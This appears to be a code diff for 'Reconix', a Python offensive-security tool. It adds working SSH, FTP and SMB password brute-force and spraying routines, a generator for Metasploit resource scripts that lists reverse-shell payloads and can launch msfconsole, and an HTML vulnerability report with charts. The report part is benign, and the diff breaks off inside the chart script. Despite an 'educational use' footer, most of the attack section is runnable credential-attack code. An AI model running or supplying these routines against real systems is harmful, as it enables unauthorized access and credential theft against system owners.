@@ -469,175 +469,958 @@ def attempt_exploitation(scan_results):
         
         selected = vuln_list[choice - 1]
         
-        print(f"\n{YELLOW}Target: {selected['host']}:{selected['port']}{RESET}")
-        print(f"{YELLOW}Vulnerability: {selected['vuln']}{RESET}\n")
+        print(f"\n{YELLOW}Target: {CYAN}{selected['host']}:{selected['port']}{RESET}")
+        print(f"{YELLOW}Vulnerability: {RED}{selected['vuln']}{RESET}\n")
         
-        lhost = input(f"{CYAN}LHOST (your IP): {RESET}")
-        lport = input(f"{CYAN}LPORT (your port): {RESET}")
+        lhost = input(f"{CYAN}Enter LHOST (your IP): {RESET}")
+        lport = input(f"{CYAN}Enter LPORT (your port, default 4444): {RESET}") or "4444"
         
-        print(f"\n{GREEN}Metasploit commands:{RESET}\n")
-        print(f"{CYAN}msfconsole{RESET}")
-        print(f"{CYAN}search {selected['service']} {selected['version']}{RESET}")
-        print(f"{CYAN}use [exploit]{RESET}")
-        print(f"{CYAN}set RHOSTS {selected['host']}{RESET}")
-        print(f"{CYAN}set RPORT {selected['port']}{RESET}")
-        print(f"{CYAN}set LHOST {lhost}{RESET}")
-        print(f"{CYAN}set LPORT {lport}{RESET}")
-        print(f"{CYAN}exploit{RESET}\n")
+        # Create Metasploit resource script
+        resource_file = f"reconix_exploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.rc"
+        
+        print(f"\n{YELLOW}[~] Creating Metasploit resource script: {resource_file}{RESET}\n")
+        
+        # Build resource script content
+        rc_content = f"""# Reconix Auto-Generated Exploit Script
+# Target: {selected['host']}:{selected['port']}
+# Vulnerability: {selected['vuln']}
+
+# Search for exploits
+search {selected['service']} {selected['version']}
+
+# If you found the right exploit, use it:
+# use exploit/path/to/exploit
+# set RHOSTS {selected['host']}
+# set RPORT {selected['port']}
+# set LHOST {lhost}
+# set LPORT {lport}
+# set payload payload/path
+# exploit
+
+# Common payloads:
+# - windows/meterpreter/reverse_tcp
+# - linux/x86/meterpreter/reverse_tcp
+# - cmd/unix/reverse_netcat
+"""
+        
+        try:
+            with open(resource_file, 'w') as f:
+                f.write(rc_content)
+            print(f"{GREEN}[+] Resource script created: {resource_file}{RESET}\n")
+        except Exception as e:
+            print_status(f"Failed to create resource script: {e}", 'error')
+        
+        print(f"{BOLD}{CYAN}{'='*70}{RESET}")
+        print(f"{BOLD}{CYAN}              EXPLOITATION GUIDE{RESET}")
+        print(f"{BOLD}{CYAN}{'='*70}{RESET}\n")
+        
+        print(f"{YELLOW}Option 1: Load Resource Script{RESET}")
+        print(f"{CYAN}  msfconsole -r {resource_file}{RESET}\n")
+        
+        print(f"{YELLOW}Option 2: Manual Commands{RESET}")
+        print(f"{CYAN}  msfconsole{RESET}")
+        print(f"{CYAN}  search {selected['service']} {selected['version']}{RESET}")
+        print(f"{CYAN}  use <exploit_path>{RESET}")
+        print(f"{CYAN}  set RHOSTS {selected['host']}{RESET}")
+        print(f"{CYAN}  set RPORT {selected['port']}{RESET}")
+        print(f"{CYAN}  set LHOST {lhost}{RESET}")
+        print(f"{CYAN}  set LPORT {lport}{RESET}")
+        print(f"{CYAN}  set payload <payload_path>{RESET}")
+        print(f"{CYAN}  exploit{RESET}\n")
+        
+        print(f"{YELLOW}Want to launch msfconsole now? (y/n): {RESET}", end='')
+        launch = input().lower()
+        
+        if launch == 'y':
+            print(f"\n{GREEN}[+] Launching msfconsole with resource script...{RESET}\n")
+            time.sleep(1)
+            os.system(f"msfconsole -r {resource_file}")
         
     except ValueError:
         print_status("Invalid input!", 'error')
+    except KeyboardInterrupt:
+        print(f"\n\n{YELLOW}Cancelled{RESET}")
+    except Exception as e:
+        print_status(f"Error: {e}", 'error')
     
     input(f"\n{YELLOW}Press Enter to continue...{RESET}")
 
+def attacking_ssh(target_ip):
+    """SSH brute force attack"""
+    import paramiko
+    
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    print(f"\n{YELLOW}Attack Mode:{RESET}")
+    print(f"{GREEN}[1]{RESET} Full Brute Force (user_list + pass_list)")
+    print(f"{GREEN}[2]{RESET} User Spray (single_user + pass_list)")
+    print(f"{GREEN}[3]{RESET} Anonymous Login Test")
+    
+    try:
+        attack_type = int(input(f"\n{CYAN}Select attack mode: {RESET}"))
+    except ValueError:
+        print_status("Invalid input!", 'error')
+        return
+    
+    if attack_type == 1:
+        user_list = input(f"{CYAN}Enter path to username list: {RESET}")
+        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
+        
+        try:
+            with open(user_list, 'r') as u:
+                users = [line.strip() for line in u if line.strip()]
+            with open(pass_list, 'r') as p:
+                passwords = [line.strip() for line in p if line.strip()]
+        except FileNotFoundError as e:
+            print_status(f"File not found: {e}", 'error')
+            return
+        
+        print_status(f"Loaded {len(users)} users and {len(passwords)} passwords", 'info')
+        print(f"\n{YELLOW}[~] Starting brute force attack on {target_ip}:22...{RESET}\n")
+        
+        found = False
+        for user in users:
+            for password in passwords:
+                try:
+                    client.connect(hostname=target_ip, username=user, password=password, timeout=3, banner_timeout=3)
+                    print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
+                    found = True
+                    client.close()
+                    return
+                except paramiko.AuthenticationException:
+                    print(f"{RED}[-]{RESET} Failed: {user}:{password}")
+                except Exception as e:
+                    print(f"{RED}[-]{RESET} Connection error: {user}:{password}")
+                finally:
+                    try:
+                        client.close()
+                    except:
+                        pass
+                    client = paramiko.SSHClient()
+                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        
+        if not found:
+            print_status("No valid credentials found", 'warning')
+    
+    elif attack_type == 2:
+        user = input(f"{CYAN}Enter username: {RESET}")
+        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
+        
+        try:
+            with open(pass_list, 'r') as p:
+                passwords = [line.strip() for line in p if line.strip()]
+        except FileNotFoundError:
+            print_status(f"Password file not found: {pass_list}", 'error')
+            return
+        
+        print_status(f"Loaded {len(passwords)} passwords", 'info')
+        print(f"\n{YELLOW}[~] Testing user '{user}' on {target_ip}:22...{RESET}\n")
+        
+        found = False
+        for password in passwords:
+            try:
+                client.connect(hostname=target_ip, username=user, password=password, timeout=3, banner_timeout=3)
+                print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
+                found = True
+                client.close()
+                return
+            except paramiko.AuthenticationException:
+                print(f"{RED}[-]{RESET} Failed: {password}")
+            except Exception as e:
+                print(f"{RED}[-]{RESET} Connection error: {password}")
+            finally:
+                try:
+                    client.close()
+                except:
+                    pass
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        
+        if not found:
+            print_status("No valid credentials found", 'warning')
+    
+    elif attack_type == 3:
+        print(f"\n{YELLOW}[~] Testing anonymous login on {target_ip}:22...{RESET}\n")
+        try:
+            client.connect(hostname=target_ip, username="anonymous", password="anonymous", timeout=5)
+            print(f"{GREEN}[+] Anonymous login SUCCESSFUL!{RESET}")
+            client.close()
+        except:
+            print(f"{RED}[-] Anonymous login failed{RESET}")
+
+def attacking_ftp(target_ip):
+    """FTP brute force attack"""
+    import ftplib
+    
+    print(f"\n{YELLOW}Attack Mode:{RESET}")
+    print(f"{GREEN}[1]{RESET} Full Brute Force (user_list + pass_list)")
+    print(f"{GREEN}[2]{RESET} User Spray (single_user + pass_list)")
+    print(f"{GREEN}[3]{RESET} Anonymous Login Test")
+    
+    try:
+        attack_type = int(input(f"\n{CYAN}Select attack mode: {RESET}"))
+    except ValueError:
+        print_status("Invalid input!", 'error')
+        return
+    
+    if attack_type == 1:
+        user_list = input(f"{CYAN}Enter path to username list: {RESET}")
+        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
+        
+        try:
+            with open(user_list, 'r') as u:
+                users = [line.strip() for line in u if line.strip()]
+            with open(pass_list, 'r') as p:
+                passwords = [line.strip() for line in p if line.strip()]
+        except FileNotFoundError as e:
+            print_status(f"File not found: {e}", 'error')
+            return
+        
+        print_status(f"Loaded {len(users)} users and {len(passwords)} passwords", 'info')
+        print(f"\n{YELLOW}[~] Starting brute force attack on {target_ip}:21...{RESET}\n")
+        
+        found = False
+        for user in users:
+            for password in passwords:
+                try:
+                    ftp = ftplib.FTP()
+                    ftp.connect(target_ip, 21, timeout=5)
+                    ftp.login(user, password)
+                    print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
+                    found = True
+                    ftp.quit()
+                    return
+                except ftplib.error_perm:
+                    print(f"{RED}[-]{RESET} Failed: {user}:{password}")
+                except Exception as e:
+                    print(f"{RED}[-]{RESET} Connection error: {user}:{password}")
+                finally:
+                    try:
+                        ftp.quit()
+                    except:
+                        pass
+        
+        if not found:
+            print_status("No valid credentials found", 'warning')
+    
+    elif attack_type == 2:
+        user = input(f"{CYAN}Enter username: {RESET}")
+        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
+        
+        try:
+            with open(pass_list, 'r') as p:
+                passwords = [line.strip() for line in p if line.strip()]
+        except FileNotFoundError:
+            print_status(f"Password file not found: {pass_list}", 'error')
+            return
+        
+        print_status(f"Loaded {len(passwords)} passwords", 'info')
+        print(f"\n{YELLOW}[~] Testing user '{user}' on {target_ip}:21...{RESET}\n")
+        
+        found = False
+        for password in passwords:
+            try:
+                ftp = ftplib.FTP()
+                ftp.connect(target_ip, 21, timeout=5)
+                ftp.login(user, password)
+                print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
+                found = True
+                ftp.quit()
+                return
+            except ftplib.error_perm:
+                print(f"{RED}[-]{RESET} Failed: {password}")
+            except Exception as e:
+                print(f"{RED}[-]{RESET} Connection error: {password}")
+            finally:
+                try:
+                    ftp.quit()
+                except:
+                    pass
+        
+        if not found:
+            print_status("No valid credentials found", 'warning')
+    
+    elif attack_type == 3:
+        print(f"\n{YELLOW}[~] Testing anonymous login on {target_ip}:21...{RESET}\n")
+        try:
+            ftp = ftplib.FTP()
+            ftp.connect(target_ip, 21, timeout=5)
+            ftp.login('anonymous', 'anonymous@')
+            print(f"{GREEN}[+] Anonymous login SUCCESSFUL!{RESET}")
+            ftp.quit()
+        except:
+            print(f"{RED}[-] Anonymous login failed{RESET}")
+
+def attacking_smb(target_ip):
+    """SMB brute force attack"""
+    try:
+        from impacket.smbconnection import SMBConnection
+    except ImportError:
+        print_status("impacket not installed! Install: pip3 install impacket", 'error')
+        return
+    
+    print(f"\n{YELLOW}Attack Mode:{RESET}")
+    print(f"{GREEN}[1]{RESET} Full Brute Force (user_list + pass_list)")
+    print(f"{GREEN}[2]{RESET} User Spray (single_user + pass_list)")
+    print(f"{GREEN}[3]{RESET} Null Session Test")
+    
+    try:
+        attack_type = int(input(f"\n{CYAN}Select attack mode: {RESET}"))
+    except ValueError:
+        print_status("Invalid input!", 'error')
+        return
+    
+    if attack_type == 1:
+        user_list = input(f"{CYAN}Enter path to username list: {RESET}")
+        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
+        
+        try:
+            with open(user_list, 'r') as u:
+                users = [line.strip() for line in u if line.strip()]
+            with open(pass_list, 'r') as p:
+                passwords = [line.strip() for line in p if line.strip()]
+        except FileNotFoundError as e:
+            print_status(f"File not found: {e}", 'error')
+            return
+        
+        print_status(f"Loaded {len(users)} users and {len(passwords)} passwords", 'info')
+        print(f"\n{YELLOW}[~] Starting brute force attack on {target_ip}:445...{RESET}\n")
+        
+        found = False
+        for user in users:
+            for password in passwords:
+                try:
+                    conn = SMBConnection(target_ip, target_ip, timeout=5)
+                    conn.login(user, password)
+                    print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
+                    found = True
+                    conn.logoff()
+                    return
+                except Exception:
+                    print(f"{RED}[-]{RESET} Failed: {user}:{password}")
+                finally:
+                    try:
+                        conn.logoff()
+                    except:
+                        pass
+        
+        if not found:
+            print_status("No valid credentials found", 'warning')
+    
+    elif attack_type == 2:
+        user = input(f"{CYAN}Enter username: {RESET}")
+        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
+        
+        try:
+            with open(pass_list, 'r') as p:
+                passwords = [line.strip() for line in p if line.strip()]
+        except FileNotFoundError:
+            print_status(f"Password file not found: {pass_list}", 'error')
+            return
+        
+        print_status(f"Loaded {len(passwords)} passwords", 'info')
+        print(f"\n{YELLOW}[~] Testing user '{user}' on {target_ip}:445...{RESET}\n")
+        
+        found = False
+        for password in passwords:
+            try:
+                conn = SMBConnection(target_ip, target_ip, timeout=5)
+                conn.login(user, password)
+                print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
+                found = True
+                conn.logoff()
+                return
+            except Exception:
+                print(f"{RED}[-]{RESET} Failed: {password}")
+            finally:
+                try:
+                    conn.logoff()
+                except:
+                    pass
+        
+        if not found:
+            print_status("No valid credentials found", 'warning')
+    
+    elif attack_type == 3:
+        print(f"\n{YELLOW}[~] Testing null session on {target_ip}:445...{RESET}\n")
+        try:
+            conn = SMBConnection(target_ip, target_ip, timeout=5)
+            conn.login('', '')
+            print(f"{GREEN}[+] Null session SUCCESSFUL!{RESET}")
+            conn.logoff()
+        except:
+            print(f"{RED}[-] Null session failed{RESET}")
+
 def brute_force_attack(scan_results):
-    """Brute force module"""
+    """Custom brute force module - no external tools needed"""
     print(f"\n{BOLD}{RED}╔══════════════════════════════════════════════════════════════╗{RESET}")
     print(f"{BOLD}{RED}║           🔨 BRUTE FORCE MODULE                              ║{RESET}")
     print(f"{BOLD}{RED}╚══════════════════════════════════════════════════════════════╝{RESET}\n")
     
-    if not check_tool('hydra'):
-        print_status("hydra not found! Install: sudo apt install hydra", 'error')
-        input(f"\n{YELLOW}Press Enter to continue...{RESET}")
-        return
+    # Find bruteforceable services
+    services_found = []
+    i = 0
     
-    services_found = {}
+    print(f"{YELLOW}Scanning for bruteforceable services...{RESET}\n")
+    
     for result in scan_results:
+        print(f"{BLUE}║{RESET} Host: {CYAN}{result['ip']}{RESET}")
         for port in result['ports']:
-            if port['state'] == 'open' and port['service'] in ['ssh', 'ftp', 'smb', 'rdp']:
-                if port['service'] not in services_found:
-                    services_found[port['service']] = []
-                services_found[port['service']].append({'host': result['ip'], 'port': port['port']})
+            if port['state'] == 'open' and port['service'] in ['ssh', 'ftp', 'smb']:
+                services_found.append((result['ip'], port['port'], port['service']))
+                print(f"{GREEN}  [{i}]{RESET} {port['service'].upper()} on port {port['port']}")
+                i += 1
     
     if not services_found:
-        print_status("No brute-forceable services found!", 'warning')
+        print_status("No bruteforceable services found!", 'warning')
         input(f"\n{YELLOW}Press Enter to continue...{RESET}")
         return
     
-    print(f"{YELLOW}Available services:{RESET}\n")
-    service_list = list(services_found.keys())
-    for idx, service in enumerate(service_list, 1):
-        print(f"{GREEN}[{idx}]{RESET} {service.upper()} - {len(services_found[service])} host(s)")
+    print(f"\n{BOLD}{WHITE}{'─'*70}{RESET}\n")
     
     try:
-        choice = int(input(f"\n{CYAN}Select service (0=cancel): {RESET}"))
-        if choice == 0 or choice > len(service_list):
+        choice = int(input(f"{CYAN}Select service to attack (0 to cancel): {RESET}"))
+        
+        if choice < 0 or choice >= len(services_found):
             return
         
-        selected_service = service_list[choice - 1]
-        targets = services_found[selected_service]
+        target_ip, target_port, target_service = services_found[choice]
         
-        print(f"\n{YELLOW}Targets:{RESET}")
-        for idx, target in enumerate(targets, 1):
-            print(f"{GREEN}[{idx}]{RESET} {target['host']}:{target['port']}")
+        print(f"\n{YELLOW}Target: {CYAN}{target_ip}:{target_port}{RESET} ({target_service.upper()})")
         
-        target_choice = int(input(f"\n{CYAN}Select target (0=all): {RESET}"))
+        if target_service == 'ssh':
+            attacking_ssh(target_ip)
+        elif target_service == 'ftp':
+            attacking_ftp(target_ip)
+        elif target_service == 'smb':
+            attacking_smb(target_ip)
         
-        print(f"\n{YELLOW}Attack mode:{RESET}")
-        print(f"{GREEN}[1]{RESET} Password Spray (user_list + single_pass)")
-        print(f"{GREEN}[2]{RESET} User Spray (single_user + pass_list)")
-        print(f"{GREEN}[3]{RESET} Full Brute Force (user_list + pass_list)")
-        
-        mode = int(input(f"\n{CYAN}Select mode: {RESET}"))
-        
-        if mode == 1:
-            user_file = input(f"{CYAN}Username list path: {RESET}")
-            password = input(f"{CYAN}Password to spray: {RESET}")
-            
-            if target_choice == 0:
-                for target in targets:
-                    print(f"\n{YELLOW}[~] Attacking {target['host']}...{RESET}")
-                    os.system(f"hydra -L {user_file} -p {password} {selected_service}://{target['host']}:{target['port']}")
-            else:
-                target = targets[target_choice - 1]
-                os.system(f"hydra -L {user_file} -p {password} {selected_service}://{target['host']}:{target['port']}")
-        
-        elif mode == 2:
-            username = input(f"{CYAN}Username: {RESET}")
-            pass_file = input(f"{CYAN}Password list path: {RESET}")
-            
-            if target_choice == 0:
-                for target in targets:
-                    print(f"\n{YELLOW}[~] Attacking {target['host']}...{RESET}")
-                    os.system(f"hydra -l {username} -P {pass_file} {selected_service}://{target['host']}:{target['port']}")
-            else:
-                target = targets[target_choice - 1]
-                os.system(f"hydra -l {username} -P {pass_file} {selected_service}://{target['host']}:{target['port']}")
-        
-        elif mode == 3:
-            user_file = input(f"{CYAN}Username list: {RESET}")
-            pass_file = input(f"{CYAN}Password list: {RESET}")
-            
-            if target_choice == 0:
-                for target in targets:
-                    print(f"\n{YELLOW}[~] Attacking {target['host']}...{RESET}")
-                    os.system(f"hydra -L {user_file} -P {pass_file} {selected_service}://{target['host']}:{target['port']}")
-            else:
-                target = targets[target_choice - 1]
-                os.system(f"hydra -L {user_file} -P {pass_file} {selected_service}://{target['host']}:{target['port']}")
-        
+    except ValueError:
+        print_status("Invalid input!", 'error')
+    except KeyboardInterrupt:
+        print(f"\n\n{YELLOW}Attack cancelled by user{RESET}")
     except Exception as e:
         print_status(f"Error: {e}", 'error')
     
     input(f"\n{YELLOW}Press Enter to continue...{RESET}")
 
 def generate_security_report(scan_results):
-    """Generate HTML report"""
+    """Generate professional HTML report with charts"""
     print(f"\n{BOLD}{BLUE}╔══════════════════════════════════════════════════════════════╗{RESET}")
     print(f"{BOLD}{BLUE}║           📊 SECURITY REPORT GENERATOR                       ║{RESET}")
     print(f"{BOLD}{BLUE}╚══════════════════════════════════════════════════════════════╝{RESET}\n")
     
     filename = f"reconix_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
     
+    # Calculate statistics
+    total_hosts = len(scan_results)
+    total_open_ports = sum(len([p for p in r['ports'] if p['state'] == 'open']) for r in scan_results)
+    total_vulns = sum(len(p['vulnerabilities']) for r in scan_results for p in r['ports'])
+    
+    # Count services
+    service_counts = {}
+    port_status = {'open': 0, 'filtered': 0, 'closed': 0}
+    risk_levels = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
+    
+    for result in scan_results:
+        for port in result['ports']:
+            # Count port states
+            port_status[port['state']] = port_status.get(port['state'], 0) + 1
+            
+            if port['state'] == 'open':
+                # Count services
+                service = port['service']
+                service_counts[service] = service_counts.get(service, 0) + 1
+                
+                # Count risk levels (simplified)
+                if port['vulnerabilities']:
+                    if 'RCE' in str(port['vulnerabilities']) or 'Execution' in str(port['vulnerabilities']):
+                        risk_levels['critical'] += 1
+                    elif 'CVE' in str(port['vulnerabilities']):
+                        risk_levels['high'] += len(port['vulnerabilities'])
+                    else:
+                        risk_levels['medium'] += len(port['vulnerabilities'])
+    
+    # Prepare data for charts
+    service_labels = list(service_counts.keys())[:10]  # Top 10 services
+    service_data = [service_counts[s] for s in service_labels]
+    
     html = f"""<!DOCTYPE html>
-<html><head><title>Reconix Report</title>
-<style>
-body {{font-family:Arial;margin:20px;background:#f5f5f5}}
-.header {{background:#2c3e50;color:white;padding:20px;border-radius:5px}}
-.host {{background:white;margin:20px 0;padding:20px;border-radius:5px}}
-.vuln {{color:#e74c3c;font-weight:bold}}
-table {{width:100%;border-collapse:collapse}}
-th,td {{padding:10px;border-bottom:1px solid #ddd}}
-th {{background:#34495e;color:white}}
-</style></head><body>
-<div class="header"><h1>Reconix Security Report</h1>
-<p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p></div>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reconix Security Report</title>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js"></script>
+    <style>
+        * {{
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }}
+        
+        body {{
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+            color: #333;
+        }}
+        
+        .container {{
+            max-width: 1400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }}
+        
+        .header {{
+            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
+            color: white;
+            padding: 40px;
+            text-align: center;
+        }}
+        
+        .header h1 {{
+            font-size: 3em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }}
+        
+        .header .subtitle {{
+            font-size: 1.2em;
+            opacity: 0.9;
+        }}
+        
+        .stats-grid {{
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            padding: 30px;
+            background: #f8f9fa;
+        }}
+        
+        .stat-card {{
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            text-align: center;
+            transition: transform 0.3s ease;
+        }}
+        
+        .stat-card:hover {{
+            transform: translateY(-5px);
+            box-shadow: 0 6px 12px rgba(0,0,0,0.15);
+        }}
+        
+        .stat-number {{
+            font-size: 3em;
+            font-weight: bold;
+            margin: 10px 0;
+        }}
+        
+        .stat-label {{
+            color: #666;
+            font-size: 1.1em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }}
+        
+        .hosts {{ color: #3498db; }}
+        .ports {{ color: #2ecc71; }}
+        .vulns {{ color: #e74c3c; }}
+        .services {{ color: #f39c12; }}
+        
+        .charts-section {{
+            padding: 30px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 30px;
+        }}
+        
+        .chart-container {{
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }}
+        
+        .chart-title {{
+            font-size: 1.5em;
+            margin-bottom: 15px;
+            color: #2c3e50;
+            text-align: center;
+        }}
+        
+        .host-section {{
+            padding: 30px;
+        }}
+        
+        .host-card {{
+            background: white;
+            margin: 20px 0;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }}
+        
+        .host-header {{
+            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
+            color: white;
+            padding: 20px;
+            font-size: 1.3em;
+        }}
+        
+        .host-info {{
+            padding: 20px;
+            border-bottom: 1px solid #e0e0e0;
+        }}
+        
+        .info-row {{
+            display: flex;
+            margin: 10px 0;
+        }}
+        
+        .info-label {{
+            font-weight: bold;
+            width: 150px;
+            color: #555;
+        }}
+        
+        .ports-table {{
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }}
+        
+        .ports-table th {{
+            background: #34495e;
+            color: white;
+            padding: 15px;
+            text-align: left;
+            font-weight: 600;
+        }}
+        
+        .ports-table td {{
+            padding: 12px 15px;
+            border-bottom: 1px solid #e0e0e0;
+        }}
+        
+        .ports-table tr:hover {{
+            background: #f8f9fa;
+        }}
+        
+        .status-open {{ color: #27ae60; font-weight: bold; }}
+        .status-filtered {{ color: #f39c12; font-weight: bold; }}
+        .status-closed {{ color: #95a5a6; }}
+        
+        .vuln-badge {{
+            display: inline-block;
+            background: #e74c3c;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 0.9em;
+            margin: 5px 5px 5px 0;
+        }}
+        
+        .vuln-critical {{ background: #c0392b; }}
+        .vuln-high {{ background: #e74c3c; }}
+        .vuln-medium {{ background: #f39c12; }}
+        .vuln-low {{ background: #3498db; }}
+        
+        .footer {{
+            background: #2c3e50;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }}
+        
+        canvas {{
+            max-height: 300px;
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔒 Reconix Security Report</h1>
+            <p class="subtitle">Generated: {datetime.now().strftime('%B %d, %Y at %H:%M:%S')}</p>
+        </div>
+        
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-label">Total Hosts</div>
+                <div class="stat-number hosts">{total_hosts}</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Open Ports</div>
+                <div class="stat-number ports">{total_open_ports}</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Vulnerabilities</div>
+                <div class="stat-number vulns">{total_vulns}</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Services</div>
+                <div class="stat-number services">{len(service_counts)}</div>
+            </div>
+        </div>
+        
+        <div class="charts-section">
+            <div class="chart-container">
+                <h3 class="chart-title">Port Status Distribution</h3>
+                <canvas id="portStatusChart"></canvas>
+            </div>
+            
+            <div class="chart-container">
+                <h3 class="chart-title">Risk Level Distribution</h3>
+                <canvas id="riskChart"></canvas>
+            </div>
+            
+            <div class="chart-container">
+                <h3 class="chart-title">Top Services Detected</h3>
+                <canvas id="servicesChart"></canvas>
+            </div>
+            
+            <div class="chart-container">
+                <h3 class="chart-title">Hosts Overview</h3>
+                <canvas id="hostsChart"></canvas>
+            </div>
+        </div>
+        
+        <div class="host-section">
+            <h2 style="text-align: center; margin-bottom: 30px; color: #2c3e50;">Detailed Host Information</h2>
 """
     
+    # Add detailed host information
     for result in scan_results:
         open_ports = [p for p in result['ports'] if p['state'] == 'open']
         vuln_count = sum(len(p['vulnerabilities']) for p in open_ports)
         
-        html += f"""<div class="host"><h2>Host: {result['ip']}</h2>
-<p><b>Hostname:</b> {result['hostname']}</p>
-<p><b>OS:</b> {result['os']}</p>
-<p><b>Vulnerabilities:</b> <span class="vuln">{vuln_count}</span></p>
-<table><tr><th>Port</th><th>Service</th><th>Version</th><th>Vulnerabilities</th></tr>
+        html += f"""
+            <div class="host-card">
+                <div class="host-header">
+                    🖥️ {result['ip']} {f"({result['hostname']})" if result['hostname'] != 'Unknown' else ''}
+                </div>
+                
+                <div class="host-info">
+                    <div class="info-row">
+                        <span class="info-label">Operating System:</span>
+                        <span>{result['os']}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Scan Time:</span>
+                        <span>{result['scan_time']}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Open Ports:</span>
+                        <span class="ports">{len(open_ports)}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Vulnerabilities:</span>
+                        <span class="vulns">{vuln_count}</span>
+                    </div>
+                </div>
 """
         
-        for port in open_ports:
-            vulns = '<br>'.join(port['vulnerabilities']) if port['vulnerabilities'] else 'None'
-            html += f"<tr><td>{port['port']}</td><td>{port['service']}</td><td>{port['version']}</td><td>{vulns}</td></tr>"
+        if open_ports:
+            html += """
+                <table class="ports-table">
+                    <thead>
+                        <tr>
+                            <th>Port</th>
+                            <th>Service</th>
+                            <th>Version</th>
+                            <th>Status</th>
+                            <th>Vulnerabilities</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+"""
+            
+            for port in open_ports:
+                status_class = 'status-' + port['state']
+                html += f"""
+                        <tr>
+                            <td><strong>{port['port']}</strong></td>
+                            <td>{port['service']}</td>
+                            <td>{port['version']}</td>
+                            <td class="{status_class}">{port['state'].upper()}</td>
+                            <td>
+"""
+                
+                if port['vulnerabilities']:
+                    for vuln in port['vulnerabilities']:
+                        severity = 'critical' if 'RCE' in vuln or 'Execution' in vuln else 'high'
+                        html += f'<span class="vuln-badge vuln-{severity}">{vuln}</span>'
+                else:
+                    html += '<span style="color: #27ae60;">✓ No known vulnerabilities</span>'
+                
+                html += """
+                            </td>
+                        </tr>
+"""
+            
+            html += """
+                    </tbody>
+                </table>
+"""
         
-        html += "</table></div>"
+        html += """
+            </div>
+"""
     
-    html += "</body></html>"
+    html += f"""
+        </div>
+        
+        <div class="footer">
+            <p>Generated by Reconix v1.0 | Educational Use Only</p>
+            <p style="margin-top: 10px; opacity: 0.8;">For authorized security testing only</p>
+        </div>
+    </div>
+    
+    <script>
+        // Port Status Chart
+        const portStatusCtx = document.getElementById('portStatusChart').getContext('2d');
+        new Chart(portStatusCtx, {{
+            type: 'doughnut',
+            data: {{
+                labels: ['Open', 'Filtered', 'Closed'],
+                datasets: [{{
+                    data: [{port_status.get('open', 0)}, {port_status.get('filtered', 0)}, {port_status.get('closed', 0)}],
+                    backgroundColor: ['#27ae60', '#f39c12', '#95a5a6']
+                }}]
+            }},
+            options: {{
+                responsive: true,
+                maintainAspectRatio: true,
+                plugins: {{
+                    legend: {{
+                        position: 'bottom'
+                    }}
+                }}
+            }}
+        }});
+        
+        // Risk Level Chart
+        const riskCtx = document.getElementById('riskChart').getContext('2d');
+        new Chart(riskCtx, {{
+            type: 'bar',
+            data: {{
+                labels: ['Critical', 'High', 'Medium', 'Low'],
+                datasets: [{{
+                    label: 'Vulnerabilities',
+                    data: [{risk_levels['critical']}, {risk_levels['high']}, {risk_levels['medium']}, {risk_levels['low']}],
